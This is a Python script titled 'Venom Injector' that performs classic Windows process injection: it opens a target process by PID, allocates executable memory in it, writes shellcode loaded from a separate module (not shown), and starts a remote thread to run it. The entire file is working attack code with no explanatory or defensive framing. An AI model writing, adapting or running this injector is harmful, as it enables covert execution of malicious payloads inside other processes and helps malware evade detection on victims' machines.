from ctypes import *
from ctypes import wintypes
import sys
import shellcode

PROCESS_ALL_ACCESS = 0x1F0FFF
MEMORY_COMMIT = 0x00001000
MEMORY_RESERVE = 0x00002000
PAGE_EXECUTE_READWRITE = 0x40
kernel32 = windll.kernel32

kernel32.OpenProcess.restype = c_void_p
kernel32.OpenProcess.argtypes = [wintypes.DWORD, wintypes.BOOL, wintypes.DWORD]

kernel32.VirtualAllocEx.restype = c_void_p
kernel32.VirtualAllocEx.argtypes = [c_void_p, c_void_p, c_size_t, wintypes.DWORD, wintypes.DWORD]

kernel32.WriteProcessMemory.restype = wintypes.BOOL
kernel32.WriteProcessMemory.argtypes = [c_void_p, c_void_p, c_void_p, c_size_t, POINTER(c_size_t)]

kernel32.CreateRemoteThread.restype = c_void_p
kernel32.CreateRemoteThread.argtypes = [c_void_p, c_void_p, c_size_t, c_void_p, c_void_p, wintypes.DWORD, c_void_p]

def inject(pid):
    print(f"[*] Injecting shellcode into PID: {pid}")
    h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, int(pid))
    if not h_process:
        print("[-] Could not acquire handle to process.")
        sys.exit()
    sc = shellcode.get_shellcode()
    sc_len = len(sc)
    print(f"[*] Allocating {sc_len} bytes in target memory.")
    arg_address = kernel32.VirtualAllocEx(h_process, 0, sc_len, MEMORY_COMMIT | MEMORY_RESERVE, PAGE_EXECUTE_READWRITE)
    if not arg_address:
        print("[-] Could not allocate memory in target process.")
        sys.exit()
    print(f"[*] Allocated memory at address: {hex(arg_address)}")
    written = c_size_t(0)
    success = kernel32.WriteProcessMemory(h_process, arg_address, sc, sc_len, byref(written))
    if not success:
        print("[-] Could not write shellcode to target process.")
        sys.exit()
    print(f"[*] Wrote {written.value} bytes to target process.")
    thread_id = wintypes.DWORD(0)
    h_thread = kernel32.CreateRemoteThread(h_process, None, 0, arg_address, None, 0, byref(thread_id))
    if not h_thread:
        print("[-] Could not create remote thread in target process.")
        sys.exit()
    print(f"[*] Remote thread created with ID: {thread_id.value}")
    kernel32.CloseHandle(h_thread)
    kernel32.CloseHandle(h_process)
    
if __name__ == "__main__":
    print("Venom Injector")
    target_pid = input("Enter Target PID: ")
    try:
        inject(target_pid)
    except Exception as e:
        print(f"[-] Injection failed: {e}")
        sys.exit()